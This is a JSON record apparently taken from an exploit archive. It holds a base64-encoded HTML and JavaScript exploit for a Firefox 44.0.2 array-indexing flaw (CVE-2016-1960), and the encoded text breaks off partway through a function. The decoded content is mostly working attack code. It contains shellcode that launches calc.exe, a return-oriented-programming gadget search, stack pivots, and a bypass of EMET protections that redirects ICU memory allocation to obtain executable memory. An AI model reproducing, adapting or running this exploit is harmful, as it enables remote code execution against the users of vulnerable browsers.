{
    "source": "exploit-database", 
    "exploit": "PCFkb2N0eXBlIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iY2FjaGUtY29udHJvbCIgY29udGVudD0ibm8tY2FjaGUiIGNoYXJzZXQ9InV0Zi04IiAvPg0KPHRpdGxlPkNWRS0yMDE2LTE5NjA8L3RpdGxlPg0KPHNjcmlwdD4NCi8qDQogKiBFeHBsb2l0IFRpdGxlOiBNb3ppbGxhIEZpcmVmb3ggPCA0NS4wIG5zSHRtbDVUcmVlQnVpbGRlciBBcnJheSBJbmRleGluZyBWdWxuZXJhYmlsaXR5IChFTUVUIDUuNTIgYnlwYXNzKQ0KICogQXV0aG9yOiBIYW5zIEplcnJ5IElsbGlrYWluZW4gKGV4cGxvaXQpLCBjYTBuZ3V5ZW4gKHZ1bG5lcmFiaWxpdHkpDQogKiBWZW5kb3IgSG9tZXBhZ2U6IGh0dHBzOi8vbW96aWxsYS5vcmcNCiAqIFNvZnR3YXJlIExpbms6IGh0dHBzOi8vZnRwLm1vemlsbGEub3JnL3B1Yi9maXJlZm94L3JlbGVhc2VzLzQ0LjAuMi93aW4zMi9lbi1VUy8NCiAqIFZlcnNpb246IDQ0LjAuMg0KICogVGVzdGVkIG9uOiBXaW5kb3dzIDcgYW5kIFdpbmRvd3MgMTANCiAqIENWRTogQ1ZFLTIwMTYtMTk2MA0KICoNCiAqIEV4cGxvaXQgZm9yIENWRS0yMDE2LTE5NjAgWzFdIHRhcmdldGluZyBGaXJlZm94IDQ0LjAuMiBbMl0gb24gV29XNjQNCiAqIHdpdGgvd2l0aG91dCBFTUVUIDUuNTIuDQogKg0KICogVGVzdGVkIG9uOg0KICogLSA2NGJpdCBXaW5kb3dzIDEwIFBybytIb21lICh2ZXJzaW9uIDE3MDMpDQogKiAtIDY0Yml0IFdpbmRvd3MgNyBQcm8gU1AxDQogKg0KICogVnVsbmVyYWJpbGl0eSBkaXNjbG9zZWQgYnkgY2Ewbmd1eWVuIFsxXS4NCiAqIEV4cGxvaXQgd3JpdHRlbiBieSBIYW5zIEplcnJ5IElsbGlrYWluZW4gPGhqaUBkeW50b3BpYS5jb20+Lg0KICoNCiAqIFsxXSBodHRwczovL2J1Z3ppbGxhLm1vemlsbGEub3JnL3Nob3dfYnVnLmNnaT9pZD0xMjQ2MDE0DQogKiBbMl0gaHR0cHM6Ly9mdHAubW96aWxsYS5vcmcvcHViL2ZpcmVmb3gvcmVsZWFzZXMvNDQuMC4yL3dpbjMyL2VuLVVTLw0KICovDQoNCiJ1c2Ugc3RyaWN0IjsNCg0KLyogVGhpcyBpcyBleGVjdXRlZCBhZnRlciBoYXZpbmcgcGl2b3RlZCB0aGUgc3RhY2suICBgZXNwJyBwb2ludHMgdG8gYQ0KICogcmVnaW9uIG9uIHRoZSBoZWFwLCBhbmQgdGhlIG9yaWdpbmFsIHN0YWNrIHBvaW50ZXIgaXMgc3RvcmVkIGluDQogKiBgZWRpJy4gIEluIG9yZGVyIHRvIGJ5cGFzcyBFTUVULCB0aGUgc2hlbGxjb2RlIHNob3VsZCBtYWtlIHN1cmUgdG8NCiAqIHhjaGcgZWRpLCBlc3AgYmVmb3JlIGFueSBwcm90ZWN0ZWQgZnVuY3Rpb24gaXMgY2FsbGVkLg0KICoNCiAqIEZvciBjb252ZW5pZW5jZSwgdGhlIGZpcnN0IHR3byAiYXJndW1lbnRzIiB0byB0aGUgc2hlbGxjb2RlIGlzIGENCiAqIG1vZHVsZSBoYW5kbGUgZm9yIGtlcm5lbDMyLmRsbCBhbmQgdGhlIGFkZHJlc3Mgb2YgR2V0UHJvY0FkZHJlc3MoKSAqLw0KY29uc3Qgc2hlbGxjb2RlID0gWw0KICAgICJceDhiXHg4NFx4MjRceDA0XHgwMFx4MDBceDAwIiwgLyogbW92IGVheCwgZHdvcmQgW2VzcCArIDB4NF0gKi8NCiAgICAiXHg4Ylx4OGNceDI0XHgwOFx4MDBceDAwXHgwMCIsIC8qIG1vdiBlY3gsIGR3b3JkIFtlc3AgKyAweDhdICovDQogICAgIlx4ODdceGU3IiwgICAgICAgICAgICAgICAgICAgICAvKiB4Y2hnIGVkaSwgZXNwICovDQogICAgIlx4NTYiLCAgICAgICAgICAgICAgICAgICAgICAgICAvKiBwdXNoIGVzaSAqLw0KICAgICJceDU3IiwgICAgICAgICAgICAgICAgICAgICAgICAgLyogcHVzaCBlZGkgKi8NCiAgICAiXHg4OVx4YzYiLCAgICAgICAgICAgICAgICAgICAgIC8qIG1vdiBlc2ksIGVheCAqLw0KICAgICJceDg5XHhjZiIsICAgICAgICAgICAgICAgICAgICAgLyogbW92IGVkaSwgZWN4ICovDQogICAgIlx4NjhceDc4XHg2NVx4NjNceDAwIiwgICAgICAgICAvKiBwdXNoIHhlY1wwICovDQogICAgIlx4NjhceDU3XHg2OVx4NmVceDQ1IiwgICAgICAgICAvKiBwdXNoIFdpbkUgKi8NCiAgICAiXHg1NCIsICAgICAgICAgICAgICAgICAgICAgICAgIC8qIHB1c2ggZXNwICovDQogICAgIlx4NTYiLCAgICAgICAgICAgICAgICAgICAgICAgICAvKiBwdXNoIGVzaSAqLw0KICAgICJceGZmXHhkNyIsICAgICAgICAgICAgICAgICAgICAgLyogY2FsbCBlZGkgKi8NCiAgICAiXHg4M1x4YzRceDA4IiwgICAgICAgICAgICAgICAgIC8qIGFkZCBlc3AsIDB4OCAqLw0KDQogICAgIlx4NmFceDAwIiwgICAgICAgICAgICAgICAgICAgICAvKiBwdXNoIDAgKi8NCiAgICAiXHg2OFx4MmVceDY1XHg3OFx4NjUiLCAgICAgICAgIC8qIHB1c2ggLmV4ZSAqLw0KICAgICJceDY4XHg2M1x4NjFceDZjXHg2MyIsICAgICAgICAgLyogcHVzaCBjYWxjICovDQogICAgIlx4ODlceGUxIiwgICAgICAgICAgICAgICAgICAgICAvKiBtb3YgZWN4LCBlc3AgKi8NCiAgICAiXHg2YVx4MDEiLCAgICAgICAgICAgICAgICAgICAgIC8qIHB1c2ggMSAqLw0KICAgICJceDUxIiwgICAgICAgICAgICAgICAgICAgICAgICAgLyogcHVzaCBlY3ggKi8NCiAgICAiXHhmZlx4ZDAiLCAgICAgICAgICAgICAgICAgICAgIC8qIGNhbGwgZWF4ICovDQogICAgIlx4ODNceGM0XHgwYyIsICAgICAgICAgICAgICAgICAvKiBhZGQgZXNwLCAweGMgKi8NCg0KICAgICJceDVmIiwgICAgICAgICAgICAgICAgICAgICAgICAgLyogcG9wIGVkaSAqLw0KICAgICJceDVlIiwgICAgICAgICAgICAgICAgICAgICAgICAgLyogcG9wIGVzaSAqLw0KICAgICJceDg3XHhlNyIsICAgICAgICAgICAgICAgICAgICAgLyogeGNoZyBlZGksIGVzcCAqLw0KICAgICJceGMzIiwgICAgICAgICAgICAgICAgICAgICAgICAgLyogcmV0ICovDQpdOw0KDQpmdW5jdGlvbiBST1BIZWxwZXIocGUsIHJ3eCkgew0KICAgIHRoaXMucGUgPSBwZTsNCiAgICB0aGlzLnJ3eCA9IHJ3eDsNCiAgICB0aGlzLmNhY2hlID0ge307DQoNCiAgICB0aGlzLnNlYXJjaCA9IGZ1bmN0aW9uKGluc3RydWN0aW9ucykgew0KICAgICAgICBmb3IgKGxldCBhZGRyIGluIHRoaXMuY2FjaGUpIHsNCiAgICAgICAgICAgIGlmICh0aGlzLm1hdGNoKHRoaXMuY2FjaGVbYWRkcl0sIGluc3RydWN0aW9ucykgPT09IHRydWUpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gYWRkcjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGNvbnN0IHRleHQgPSB0aGlzLnBlLnRleHQ7DQogICAgICAgIGZvciAobGV0IGFkZHIgPSB0ZXh0LmJhc2U7IGFkZHIgPCB0ZXh0LmJhc2UgKyB0ZXh0LnNpemU7IGFkZHIrKykgew0KICAgICAgICAgICAgY29uc3QgcmVhZCA9IHRoaXMucnd4LnJlYWRCeXRlcyhhZGRyLCBpbnN0cnVjdGlvbnMubGVuZ3RoKTsNCiAgICAgICAgICAgIGlmICh0aGlzLm1hdGNoKGluc3RydWN0aW9ucywgcmVhZCkgPT09IHRydWUpIHsNCiAgICAgICAgICAgICAgICB0aGlzLmNhY2hlW2FkZHJdID0gaW5zdHJ1Y3Rpb25zOw0KICAgICAgICAgICAgICAgIHJldHVybiBhZGRyOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJjb3VsZCBub3QgZmluZCBnYWRnZXRzIGZvciAiICsgaW5zdHJ1Y3Rpb25zKTsNCiAgICB9Ow0KDQogICAgdGhpcy5tYXRjaCA9IGZ1bmN0aW9uKGEsIGIpIHsNCiAgICAgICAgaWYgKGEubGVuZ3RoICE9PSBiLmxlbmd0aCkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQoNCiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhLmxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgICBpZiAoYVtpXSAhPT0gYltpXSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9Ow0KDQogICAgdGhpcy5leGVjdXRlID0gZnVuY3Rpb24oZnVuYywgYXJncywgY2xlYW51cCkgew0KICAgICAgICBjb25zdCB1MzJhcnJheSA9IHRoaXMucnd4LnUzMmFycmF5Ow0KICAgICAgICBjb25zdCByZXQgPSB0aGlzLnJ3eC5jYWxsb2MoNCk7DQogICAgICAgIGxldCBpID0gdGhpcy5yd3guZGl2Lm1lbS5pZHggKyAyOTQxOyAvKiBnYWRnZXRzIGFmdGVyIFtBXSBhbmQgW0JdICovDQoNCiAgICAgICAgLyoNCiAgICAgICAgICogW0FdIHN0YWNrIHBpdm90DQogICAgICAgICAqDQogICAgICAgICAqIHhjaGcgZWF4LCBlc3ANCiAgICAgICAgICogcmV0IDB4MmRlOA0KICAgICAgICAgKi8NCiAgICAgICAgY29uc3QgcGl2b3QgPSB0aGlzLnNlYXJjaChbMHg5NCwgMHhjMiwgMHhlOCwgMHgyZF0pOw0KDQogICAgICAgIC8qDQogICAgICAgICAqIFtCXSBwcmVzZXJ2ZSBvbGQgZXNwIGluIGEgbm9udm9sYXRpbGUgcmVnaXN0ZXINCiAgICAgICAgICoNCiAgICAgICAgICogeGNoZyBlYXgsIGVkaQ0KICAgICAgICAgKiByZXQNCiAgICAgICAgICovDQogICAgICAgIGNvbnN0IGFmdGVyID0gdGhpcy5zZWFyY2goWzB4OTcsIDB4YzNdKTsNCg0KICAgICAgICAvKg0KICAgICAgICAgKiBbQ10gYWRkcmVzcyB0byBleGVjdXRlDQogICAgICAgICAqLw0KICAgICAgICB1MzJhcnJheVtpKytdID0gZnVuYzsNCg0KICAgICAgICBpZiAoY2xlYW51cCA9PT0gdHJ1ZSAmJiBhcmdzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIGlmIChhcmdzLmxlbmd0aCA+IDEpIHsNCiAgICAgICAgICAgICAgICAvKg0KICAgICAgICAgICAgICAgICAqIFtFXSByZXR1cm4gYWRkcmVzcyBmcm9tIFtDXTogY2xlYW51cCBhcmdzIG9uIHRoZSBzdGFjaw0KICAgICAgICAgICAgICAgICAqDQogICAgICAgICAgICAgICAgICogYWRkIGVzcCwgYXJncy5sZW5ndGgqNA0KICAgICAgICAgICAgICAgICAqIHJldA0KICAgICAgICAgICAgICAgICAqLw0KICAgICAgICAgICAgICAgIHUzMmFycmF5W2krK10gPSB0aGlzLnNlYXJjaChbMHg4MywgMHhjNCwgYXJncy5sZW5ndGgqNCwgMHhjM10pOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAvKg0KICAgICAgICAgICAgICAgICAqIFtFXSByZXR1cm4gYWRkcmVzcyBmcm9tIFtDXTogY2xlYW51cCBhcmcNCiAgICAgICAgICAgICAgICAgKg0KICAgICAgICAgICAgICAgICAqIHBvcCBlY3gNCiAgICAgICAgICAgICAgICAgKiByZXQNCiAgICAgICAgICAgICAgICAgKi8NCiAgICAgICAgICAgICAgICB1MzJhcnJheVtpKytdID0gdGhpcy5zZWFyY2goWzB4NTksIDB4YzNdKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIC8qDQogICAgICAgICAgICAgKiBbRV0gcmV0dXJuIGFkZHJlc3MgZnJvbSBbQ10NCiAgICAgICAgICAgICAqDQogICAgICAgICAgICAgKiByZXQNCiAgICAgICAgICAgICAqLw0KICAgICAgICAgICAgdTMyYXJyYXlbaSsrXSA9IHRoaXMuc2VhcmNoKFsweGMzXSk7DQogICAgICAgIH0NCg0KICAgICAgICAvKg0KICAgICAgICAgKiBbRF0gYXJndW1lbnRzIGZvciBbQ10NCiAgICAgICAgICovDQogICAgICAgIGZvciAobGV0IGogPSAwOyBqIDwgYXJncy5sZW5ndGg7IGorKykgew0KICAgICAgICAgICAgdTMyYXJyYXlbaSsrXSA9IGFyZ3Nbal07DQogICAgICAgIH0NCg0KICAgICAgICAvKg0KICAgICAgICAgKiBbRl0gcG9wIHRoZSBsb2NhdGlvbiBmb3IgdGhlIHJldHVybiB2YWx1ZQ0KICAgICAgICAgKg0KICAgICAgICAgKiBwb3AgZWN4DQogICAgICAgICAqIHJldA0KICAgICAgICAgKi8NCiAgICAgICAgdTMyYXJyYXlbaSsrXSA9IHRoaXMuc2VhcmNoKFsweDU5LCAweGMzXSk7DQoNCiAgICAgICAgLyoNCiAgICAgICAgICogW0ddIGFkZHJlc3MgdG8gc3RvcmUgdGhlIHJldHVybiB2YWx1ZQ0KICAgICAgICAgKi8NCiAgICAgICAgdTMyYXJyYXlbaSsrXSA9IHJldC5hZGRyOw0KDQogICAgICAgIC8qDQogICAgICAgICAqIFtIXSBtb3ZlIHRoZSByZXR1cm4gdmFsdWUgdG8gW0ddDQogICAgICAgICAqDQogICAgICAgICAqIG1vdiBkd29yZCBbZWN4XSwgZWF4DQogICAgICAgICAqIHJldA0KICAgICAgICAgKi8NCiAgICAgICAgdTMyYXJyYXlbaSsrXSA9IHRoaXMuc2VhcmNoKFsweDg5LCAweDAxLCAweGMzXSk7DQoNCiAgICAgICAgLyoNCiAgICAgICAgICogW0ldIHJlc3RvcmUgdGhlIG9yaWdpbmFsIGVzcCBhbmQgcmV0dXJuDQogICAgICAgICAqDQogICAgICAgICAqIG1vdiBlc3AsIGVkaQ0KICAgICAgICAgKiByZXQNCiAgICAgICAgICovDQogICAgICAgIHUzMmFycmF5W2krK10gPSB0aGlzLnNlYXJjaChbMHg4OSwgMHhmYywgMHhjM10pOw0KDQogICAgICAgIHRoaXMucnd4LmV4ZWN1dGUocGl2b3QsIGFmdGVyKTsNCg0KICAgICAgICByZXR1cm4gdTMyYXJyYXlbcmV0LmlkeF07DQogICAgfTsNCn0NCg0KZnVuY3Rpb24gSUNVVUM1NShyb3AsIHBlLCByd3gpIHsNCiAgICB0aGlzLnJvcCA9IHJvcDsNCiAgICB0aGlzLnBlID0gcGU7DQogICAgdGhpcy5yd3ggPSByd3g7DQogICAgdGhpcy5rZXJuZWwzMiA9IG5ldyBLRVJORUwzMihyb3AsIHBlLCByd3gpOw0KICAgIHRoaXMuaWN1dWM1NWhhbmRsZSA9IHRoaXMua2VybmVsMzIuR2V0TW9kdWxlSGFuZGxlQSgiaWN1dWM1NS5kbGwiKTsNCg0KICAgIC8qDQogICAgICogVGhlIGludm9jYXRpb24gb2YgdXBydl9tYWxsb2NfNTUoKSByZXF1aXJlcyBzcGVjaWFsIGNhcmUgc2luY2UNCiAgICAgKiBwQWxsb2MgcG9pbnRzIHRvIGEgcHJvdGVjdGVkIGZ1bmN0aW9uIChWaXJ0dWFsQWxsb2MpLg0KICAgICAqDQogICAgICogUk9QSGVscGVyLmV4ZWN1dGUoKSBjYW4ndCBiZSB1c2VkIGJlY2F1c2U6DQogICAgICogMS4gaXQgcGl2b3RzIHRoZSBzdGFjayB0byB0aGUgaGVhcCAoU3RhY2tQaXZvdCBwcm90ZWN0aW9uKQ0KICAgICAqIDIuIGl0IHJldHVybnMgaW50byB0aGUgc3BlY2lmaWVkIGZ1bmN0aW9uIChDYWxsZXIgcHJvdGVjdGlvbikNCiAgICAgKiAzLiB0aGUgZm9yd2FyZCBST1AgY2hhaW4gaXMgYmFzZWQgb24gcmV0dXJucyAoU2ltRXhlY0Zsb3cgcHJvdGVjdGlvbikNCiAgICAgKg0KICAgICAqIFRoaXMgZnVuY3Rpb24gY29uc2lzdCBvZiBzZXZlcmFsIHN0ZXBzOg0KICAgICAqIDEuIGEgc2Vjb25kLXN0YWdlIFJPUCBjaGFpbiBpcyB3cml0dGVuIHRvIHRoZSBzdGFjaw0KICAgICAqIDIuIGEgZmlyc3Qtc3RhZ2UgUk9QIGNoYWluIGlzIGV4ZWN1dGVkIHRoYXQgcGl2b3RzIHRvIHRoZSBoZWFwDQogICAgICogMy4gdGhlIGZpcnN0LXN0YWdlIFJPUCBjaGFpbiBjb250aW51ZXMgYnkgcGl2b3RpbmcgdG8gIzENCiAgICAgKiA0LiB1cHJ2X21hbGxvY181NSgpIGlzIGludm9rZWQNCiAgICAgKiA1LiB0aGUgcmV0dXJuIHZhbHVlIGlzIHNhdmVkDQogICAgICogNi4gdGhlIG9yaWdpbmFsIHN0YWNrIGlzIHJlc3RvcmVkDQogICAgICoNCiAgICAgKiBPZiBub3RlIGlzIHRoYXQgdXBydl9tYWxsb2NfNTUoKSBvbmx5IHRha2VzIGEgYHNpemUnIGFyZ3VtZW50LA0KICAgICAqIGFuZCBpdCBwYXNzZXMgdHdvIGFyZ3VtZW50cyB0byB0aGUgaGlqYWNrZWQgcEFsbG9jIGZ1bmN0aW9uDQogICAgICogcG9pbnRlciAoY29udGV4dCBhbmQgc2l6ZTsgYm90aCBpbiBvdXIgY29udHJvbCkuICBWaXJ0dWFsQWxsb2MsDQogICAgICogb24gdGhlIG90aGVyIGhhbmQsIGV4cGVjdHMgZm91ciBhcmd1bWVudHMuICBTbywgd2UnbGwgaGF2ZSB0bw0KICAgICAqIHNldHVwIHRoZSBzdGFjayBzbyB0aGF0IHRoZSB2YWx1ZXMgaW50ZXJwcmV0ZWQgYnkgVmlydHVhbEFsbG9jIGFzDQogICAgICogaXRzIGFyZ3VtZW50cyBhcmUgcmVhc29uYWJseS1sb29raW5nLg0KICAgICAqDQogICAgICogQnkgdGhlIHRpbWUgdGhhdCB1cHJ2X21hbGxvY181NSgpIGlzIHJldHVybmVkIGludG8sIHRoZSBzdGFjaw0KICAgICAqIHdpbGwgbG9vayBsaWtlOg0KICAgICAqIFtBXSBbQl0gW0NdIFtEXQ0KICAgICAqDQogICAgICogV2hlbiBwQWxsb2MgaXMgZW50ZXJlZCwgdGhlIHN0YWNrIHdpbGwgbG9vayBsaWtlOg0KICAgICAqIFt1cHJ2X21hbGxvY181NSgpLXJldF0gW3BDb250ZXh0XSBbQl0gW0FdIFtCXSBbQ10gW0RdDQogICAgICoNCiAgICAgKiBTaW5jZSB3ZSd2ZSBzZXQgcEFsbG9jIHRvIHBvaW50IGF0IFZpcnR1YWxBbGxvYywgdGhlIGNhbGwgaXMNCiAgICAgKiBpbnRlcnByZXRlZCBhcyBWaXJ0dWFsQWxsb2MocENvbnRleHQsIEIsIEEsIEIpOw0KICAgICAqDQogICAgICogSGVuY2UsIGJlY2F1c2Ugd2Ugd2FudCBgZmxQcm90ZWN0JyB0byBiZSBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFLA0KICAgICAqIHdlIGFsc28gaGF2ZSB0byBoYXZlIGEgYHNpemUnIHdpdGggdGhlIHNhbWUgdmFsdWU7IG1lYW5pbmcgb3VyDQogICAgICogcnd4IGFsbG9jYXRpb24gd2lsbCBvbmx5IGJlIDB4NDAgYnl0ZXMuDQogICAgICoNCiAgICAgKiBUaGlzIGlzIG5vdCBhIHByb2JsZW0sIHNpbmNlIHdlIGNhbiBzaW1wbHkgd3JpdGUgYSBzbWFsbCBzbmlwcGV0DQogICAgICogb2Ygc2hlbGxjb2RlIHRoYXQgYWxsb2NhdGVzIGEgbGFyZ2VyIHJlZ2lvbiBpbiBhIG5vbi1ST1B5IHdheQ0KICAgICAqIGFmdGVyd2FyZHMuDQogICAgICovDQogICAgdGhpcy51cHJ2X21hbGxvY181NSA9IGZ1bmN0aW9uKHN0YWNrQWRkcikgew0KICAgICAgICBjb25zdCBmdW5jID0gdGhpcy5rZXJuZWwzMi5HZXRQcm9jQWRkcmVzcyh0aGlzLmljdXVjNTVoYW5kbGUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ1cHJ2X21hbGxvY181NSIpOw0KICAgICAgICBjb25zdCByZXQgPSB0aGlzLnJ3eC5jYWxsb2MoNCk7DQogICAgICAgIGNvbnN0IHUzMmFycmF5ID0gdGhpcy5yd3gudTMyYXJyYXk7DQoNCiAgICAgICAgLyoqKioqKioqKioqKioqKioqKioqKioNCiAgICAgICAgICogc2Vjb25kIHN0YWdlIGdhZGdldHMNCiAgICAgICAgICoqKioqKioqKioqKioqKioqKioqKiovDQogICAgICAgIGNvbnN0IHN0YWNrR2FkZ2V0cyA9IG5ldyBBcnJheSgNCiAgICAgICAgICAgIGZ1bmMsDQoNCiAgICAgICAgICAgIDB4MTAwMCwgICAgIC8qIFtBXSBmbEFsbG9jYXRpb25UeXBlIChNRU1fQ09NTUlUKSAqLw0KICAgICAgICAgICAgMHg0MCwgICAgICAgLyogW0JdIGR3U2l6ZSBhbmQgZmxQcm90ZWN0IChQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKSAqLw0KICAgICAgICAgICAgMHg0MTQxNDE0MSwgLyogW0NdICovDQogICAgICAgICAgICAweDQyNDI0MjQyLCAvKiBbRF0gKi8NCg0KICAgICAgICAgICAgLyoNCiAgICAgICAgICAgICAqIGxvY2F0aW9uIHRvIHdyaXRlIHRoZSByZXR1cm4gdmFsdWUNCiAgICAgICAgICAgICAqDQogICAgICAgICAgICAgKiBwb3AgZWN4DQogICAgICAgICAgICAgKiByZXQNCiAgICAgICAgICAgICAqLw0KICAgICAgICAgICAgdGhpcy5yb3Auc2VhcmNoKFsweDU5LCAweGMzXSksDQogICAgICAgICAgICByZXQuYWRkciwNCg0KICAgICAgICAgICAgLyoNCiAgICAgICAgICAgICAqIGRvIHRoZSB3cml0ZQ0KICAgICAgICAgICAgICoNCiAgICAgICAgICAgICAqIG1vdiBkd29yZCBbZWN4XSwgZWF4DQogICAgICAgICAgICAgKiByZXQNCiAgICAgICAgICAgICAqLw0KICAgICAgICAgICAgdGhpcy5yb3Auc2VhcmNoKFsweDg5LCAweDAxLCAweGMzXSksDQoNCiAgICAgICAgICAgIC8qDQogICAgICAgICAgICAgKiByZXN0b3JlIHRoZSBvbGQgc3RhY2sNCiAgICAgICAgICAgICAqDQogICAgICAgICAgICAgKiBtb3YgZXNwLCBlZGkNCiAgICAgICAgICAgICAqIHJldA0KICAgICAgICAgICAgICovDQogICAgICAgICAgICB0aGlzLnJvcC5zZWFyY2goWzB4ODksIDB4ZmMsIDB4YzNdKQ0KICAgICAgICApOw0KDQogICAgICAgIGNvbnN0IG9yaWdTdGFjayA9IHRoaXMucnd4LnJlYWREV29yZHMoc3RhY2tBZGRyLCBzdGFja0dhZGdldHMubGVuZ3RoKTsNCiAgICAgICAgdGhpcy5yd3gud3JpdGVEV29yZHMoc3RhY2tBZGRyLCBzdGFja0dhZGdldHMpOw0KDQoNCiAgICAgICAgLyoqKioqKioqKioqKioqKioqKioqKg0KICAgICAgICAgKiBmaXJzdCBzdGFnZSBnYWRnZXRzDQogICAgICAgICAqKioqKioqKioqKioqKioqKioqKiovDQogICAgICAgIC8qDQogICAgICAgICAqIHBpdm90DQogICAgICAgICAqDQogICAgICAgICAqIHhjaGcgZWF4LCBlc3ANCiAgICAgICAgICogcmV0IDB4MmRlOA0KICAgICAgICAgKi8NCiAgICAgICAgY29uc3QgcGl2b3QgPSB0aGlzLnJvcC5zZWFyY2goWzB4OTQsIDB4YzIsIDB4ZTgsIDB4MmRdKTsNCg0KICAgICAgICAvKg0KICAgICAgICAgKiBwcmVzZXJ2ZSBvbGQgZXNwIGluIGEgbm9udm9sYXRpbGUgcmVnaXN0ZXINCiAgICAgICAgICoNCiAgICAgICAgICogeGNoZyBlYXgsIGVkaQ0KICAgICAgICAgKiByZXQNCiAgICAgICAgICovDQogICAgICAgIGNvbnN0IGFmdGVyID0gdGhpcy5yb3Auc2VhcmNoKFsweDk3LCAweGMzXSk7DQoNCiAgICAgICAgLyoNCiAgICAgICAgICogcGl2b3QgdG8gdGhlIHNlY29uZCBzdGFnZQ0KICAgICAgICAgKg0KICAgICAgICAgKiBwb3AgZXNwDQogICAgICAgICAqIHJldA0KICAgICAgICAgKi8NCiAgICAgICAgdTMyYXJyYXlbdGhpcy5yd3guZGl2Lm1lbS5pZHggKyAyOTQxXSA9IHRoaXMucm9wLnNlYXJjaChbMHg1YywgMHhjM10pOw0KICAgICAgICB1MzJhcnJheVt0aGlzLnJ3eC5kaXYubWVtLmlkeCArIDI5NDJdID0gc3RhY2tBZGRyOw0KDQogICAgICAgIC8qDQogICAgICAgICAqIGhlcmUgd2UgZ28gOikNCiAgICAgICAgICovDQogICAgICAgIHRoaXMucnd4LmV4ZWN1dGUocGl2b3QsIGFmdGVyKTsNCiAgICAgICAgdGhpcy5yd3gud3JpdGVEV29yZHMoc3RhY2tBZGRyLCBvcmlnU3RhY2spOw0KDQogICAgICAgIGlmICh1MzJhcnJheVtyZXQuaWR4XSA9PT0gMCkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJ1cHJ2X21hbGxvY181NSgpIGZhaWxlZCIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiB1MzJhcnJheVtyZXQuaWR4XTsNCiAgICB9Ow0KDQogICAgLyoNCiAgICAgKiBPdmVycmlkZXMgdGhlIHBvaW50ZXJzIGluIGZpcmVmb3gtNDQuMC4yL2ludGwvaWN1L3NvdXJjZS9jb21tb24vY21lbW9yeS5jDQogICAgICovDQogICAgdGhpcy51X3NldE1lbW9yeUZ1bmN0aW9uc181NSA9IGZ1bmN0aW9uKGNvbnRleHQsIGEsIHIsIGYsIHN0YXR1cykgew0KICAgICAgICBjb25zdCBmdW5jID0gdGhpcy5rZXJuZWwzMi5HZXRQcm9jQWRkcmVzcyh0aGlzLmljdXVjNTVoYW5kbGUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ1X3NldE1lbW9yeUZ1bmN0aW9uc181NSIpOw0KICAgICAgICB0aGlzLnJvcC5leGVjdXRlKGZ1bmMsIFtjb250ZXh0LCBhLCByLCBmLCBzdGF0dXNdLCB0cnVlKTsNCiAgICB9Ow0KDQogICAgLyoNCiAgICAgKiBTZXRzIGBwQWxsb2MnIHRvIFZpcnR1YWxBbGxvYy4gIGBwUmVhbGxvYycgYW5kIGBwRnJlZScgYXJlDQogICAgICogc2V0IHRvIHBvaW50IHRvIHNtYWxsIGdhZGdldHMuDQogICAgICovDQogICAgdGhpcy5zZXQgPSBmdW5jdGlvbigpIHsNCiAgICAgICAgY29uc3Qgc3RhdHVzID0gdGhpcy5yd3guY2FsbG9jKDQpOw0KICAgICAgICBjb25zdCBhbGxvYyA9IHRoaXMucGUuc2VhcmNoKCJrZXJuZWwzMi5kbGwiLCAiVmlydHVhbEFsbG9jIik7DQoNCiAgICAgICAgLyogcHJldGVuZCB0byBiZSBhIGZhaWxlZCByZWFsbG9jYXRpb24NCiAgICAgICAgICoNCiAgICAgICAgICogeG9yIGVheCwgZWF4DQogICAgICAgICAqIHJldCAqLw0KICAgICAgICBjb25zdCByZWFsbG9jID0gdGhpcy5yb3Auc2VhcmNoKFsweDMzLCAweGMwLCAweGMzXSk7DQoNCiAgICAgICAgLyogbGV0IHRoZSBjaHVuayBsaXZlDQogICAgICAgICAqDQogICAgICAgICAqIHJldCAqLw0KICAgICAgICBjb25zdCBmcmVlID0gdGhpcy5yb3Auc2VhcmNoKFsweGMzXSk7DQoNCiAgICAgICAgdGhpcy51X3NldE1lbW9yeUZ1bmN0aW9uc181NSgwLCBhbGxvYywgcmVhbGxvYywgZnJlZSwgc3RhdHVzLmFkZHIpOw0KICAgICAgICBpZiAodGhpcy5yd3gudTMyYXJyYXlbc3RhdHVzLmlkeF0gIT09IDApIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigidV9zZXRNZW1vcnlGdW5jdGlvbnNfNTUoKSBmYWlsZWQiKTsNCiAgICAgICAgfQ0KICAgIH07DQoNCiAgICAvKg0KICAgICAqIFRoaXMgKHNvcnQgb2YpIHJlc3RvcmVzIHRoZSBmdW5jdGlvbmFsaXR5IGluDQogICAgICogaW50bC9pY3Uvc291cmNlL2NvbW1vbi9jbWVtb3J5LmMgYnkgcmV1c2luZyB0aGUgcHJldmlvdXNseQ0KICAgICAqIGFsbG9jYXRlZCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFIGNodW5rIHRvIHNldCB1cCB0aHJlZSBzdHVicyB0aGF0DQogICAgICogaW52b2tlcyBhbiBhcHByb3ByaWF0ZSBmdW5jdGlvbiBpbiBtb3pnbHVlLmRsbA0KICAgICAqLw0KICAgIHRoaXMucmVzZXQgPSBmdW5jdGlvbihjaHVuaykgew0KICAgICAgICBjb25zdCB1MzJhcnJheSA9IHRoaXMucnd4LnUzMmFycmF5Ow